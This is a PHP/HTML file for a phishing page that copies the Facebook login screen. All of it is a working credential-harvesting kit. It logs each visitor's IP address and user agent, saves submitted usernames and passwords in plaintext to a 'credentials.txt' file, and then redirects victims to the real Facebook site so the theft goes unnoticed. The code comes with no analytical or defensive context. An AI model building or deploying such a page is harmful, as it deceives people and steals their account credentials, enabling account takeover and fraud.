<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook</title>
<link rel="icon" type="image/x-icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
<style>
	body {
		font-family: 'Arial', sans-serif;
		background-color: #f0f2f5;
		margin: 0;
		display: flex;
		justify-content: center;
		align-items: center;
		height: 100vh;
	}

	.login-container {
		background-color: #fff;
		border-radius: 8px;
		box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
		padding: 20px;
		width: 400px;
		text-align: center;
	}

	.login-container h2 {
		color: #1877f2;
		font-size: 24px;
		margin-bottom: 20px;
	}

	.login-form {
		display: flex;
		flex-direction: column;
		gap: 15px;
	}

	.login-form input {
		width: 95%;
		padding: 10px;
		border: 1px solid #dddfe2;
		border-radius: 4px;
		font-size: 14px;
	}

	.login-form button {
		width: 100%;
		padding: 12px;
		background-color: #1877f2;
		color: #fff;
		border: none;
		border-radius: 4px;
		cursor: pointer;
		font-size: 16px;
	}

	.login-form button:hover {
		background-color: #166fe5;
	}

	.create-account-btn {
		margin-top: 10px;
		color: #1877f2;
		cursor: pointer;
	}
</style>
</head>
<body>

<div class="login-container">
    <h2>Log in to Facebook</h2>
    <form class="login-form" action="" method="post">
        <input type="text" name="username" placeholder="Email or Phone Number" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>
    <div class="create-account-btn">Create New Account</div>
</div>

</body>
</html>

<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
  $ip = $_SERVER['HTTP_CLIENT_IP']."\r\n";
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
}
else
{
  $ip = $_SERVER['REMOTE_ADDR']."\r\n";
}
$useragent = $_SERVER['HTTP_USER_AGENT'];

$filename = "../credentials.txt";

$data = "\n|-------------------FACEBOOK-------------------|\n" . "User-Agent: " . $useragent . "\n" . "IP: " . $ip . "\n";
file_put_contents($filename, $data, FILE_APPEND);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $data = "User: " . $username . "\n" . "Password: " . $password . "\n|-------------------FACEBOOK-------------------|\n";
    file_put_contents($filename, $data, FILE_APPEND);
    header("Location: https://www.facebook.com");
}
?>
